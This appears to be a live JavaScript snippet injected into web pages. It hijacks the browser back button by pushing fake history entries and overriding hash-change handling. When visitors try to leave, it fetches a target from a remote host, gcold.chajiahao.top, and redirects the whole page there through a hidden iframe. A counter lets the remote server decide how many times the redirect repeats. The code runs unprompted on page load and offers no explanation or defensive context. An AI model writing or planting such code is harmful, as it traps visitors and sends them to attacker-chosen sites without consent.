window.onpageshow = function() {
    sessionStorage.getItem('jumpOut') && a();
}

function a() {
    var jumpOut = parseInt(sessionStorage.getItem('jumpOut')) || 0;
    var maxOut = parseInt(sessionStorage.getItem('maxJumpOut')) || 28;
    if (jumpOut >= maxOut) { 
        return;
    }
    var rbid = sessionStorage.getItem('jumpOut') ? 10000: 11111;
    window.fetch('https://gcold.chajiahao.top/dxyuedu?id=3166&rbid='+rbid+'&cb=json').then(function(res){
        return res.json();
    }).then(function(data){
        if (data.x) {
            sessionStorage.setItem('maxJumpOut', data.x);
        }
        var f = document.createElement("iframe");
        f.style.display = "none";
        document.body.appendChild(f).src = "javascript:\"<script>top.location.href = '" + data.url + "'<\/script>\""
    });
    sessionStorage.setItem('jumpOut', ++jumpOut);
}

function ntzgo() {
    history.pushState(history.length + 1, "message", window.location.href.split("#")[0] + "#" + new Date()
        .getTime());
    if (navigator.userAgent.indexOf("Android") != -1) {
        if (typeof(tbsJs) != "undefined") {
            tbsJs.onReady("{useCachedApi : 'true'}", function(e) {});
            window.onhashchange = function() {
                window.history.pushState("forward", null, "#");
                window.history.forward(1);
                a()
            }
        } else {
            var pop = 0;
            window.onhashchange = function(event) {
                pop++;
                if (pop >= 3) {
                    a()
                } else {
                    history.go(1)
                }
            };
            history.go(-1)
        }
    } else {
        window.onhashchange = function() {
            a()
        }
    }
};

ntzgo();
